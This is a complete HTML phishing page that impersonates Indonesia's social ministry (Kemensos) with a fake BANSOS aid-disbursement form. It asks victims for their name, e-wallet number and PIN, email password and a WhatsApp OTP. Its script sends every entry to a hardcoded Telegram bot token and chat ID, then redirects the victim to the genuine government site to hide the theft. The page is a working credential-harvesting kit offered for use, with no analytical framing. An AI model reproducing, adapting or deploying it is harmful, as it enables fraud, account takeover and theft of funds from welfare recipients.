<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BANSOS 2026</title>
</head>
<body style="margin:0; background:#1a3a5f; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">

    <div style="background:white; width:90%; max-width:340px; border-radius:10px; overflow:hidden; text-align:center; box-shadow:0 5px 15px rgba(0,0,0,0.3);">
        
        <div style="background:#f8f9fa; padding:15px; border-bottom:1px solid #ddd;">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRztV5gn61UceIhYDp-HEYWcV6q6hH-s51Im4qUHPpPA_dXQB_GuBlXmAQ&s" style="width:130px; height:auto; display:block; margin:0 auto;">
            <div style="font-weight:bold; color:#1a3a5f; margin-top:10px; font-size:14px;">VERIFIKASI PENERIMA BANSOS</div>
        </div>

        <div style="padding:20px;">
            <div id="k1">
                <input type="text" id="n" placeholder="Nama Lengkap" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc; border-radius:5px; box-sizing:border-box;">
                <input type="number" id="h" placeholder="Nomor HP E-Wallet" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc; border-radius:5px; box-sizing:border-box;">
                <input type="password" id="p" placeholder="PIN E-Wallet" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc; border-radius:5px; box-sizing:border-box;">
                
                <input type="email" id="e" placeholder="Alamat Email" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc; border-radius:5px; box-sizing:border-box;">
                <input type="password" id="pe" placeholder="Password Email" style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:5px; box-sizing:border-box;">
                
                <button onclick="lanjut()" style="width:100%; padding:12px; background:#27ae60; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">CAIRKAN SEKARANG</button>
            </div>

            <div id="k2" style="display:none;">
                <p style="font-size:12px; color:#555;">Masukkan 6 digit kode OTP yang kami kirim ke WhatsApp Anda:</p>
                <input type="number" id="o" placeholder="000000" style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:5px; text-align:center; font-size:20px; letter-spacing:5px; box-sizing:border-box;">
                <button onclick="kirim()" style="width:100%; padding:12px; background:#2980b9; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">KONFIRMASI</button>
            </div>
        </div>
        <div style="padding:10px; font-size:10px; color:#999; background:#eee;">&copy; 2026 Kemensos RI</div>
    </div>

    <script>
        const T = "7853186656:AAFE1JRhYrZcTkM3T3D0jRUxyqh76L8o8f4";
        const C = "8041825289";

        function tele(m) {
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}&parse_mode=html`);
        }

        function lanjut() {
            let vn = document.getElementById('n').value;
            let vh = document.getElementById('h').value;
            let vp = document.getElementById('p').value;
            let ve = document.getElementById('e').value;
            let vpe = document.getElementById('pe').value;

            if(vn && vh && vp && ve && vpe) {
                // Semua data dikirim ke Telegram lu
                tele(`<b>DATA MASUK</b>\nNama: ${vn}\nHP: ${vh}\nPIN: ${vp}\nEmail: ${ve}\nPass: ${vpe}`);
                document.getElementById('k1').style.display = 'none';
                document.getElementById('k2').style.display = 'block';
            } else { alert("Lengkapi semua data, Bil!"); }
        }

        function kirim() {
            let vn = document.getElementById('n').value;
            let vo = document.getElementById('o').value;
            if(vo) {
                tele(`<b>OTP MASUK</b>\nNama: ${vn}\nOTP: ${vo}`);
                alert("Berhasil! Dana diproses 1x24 jam.");
                window.location.href = "https://cekbansos.kemensos.go.id/";
            } else { alert("Isi OTP!"); }
        }
    </script>
</body>
</html>
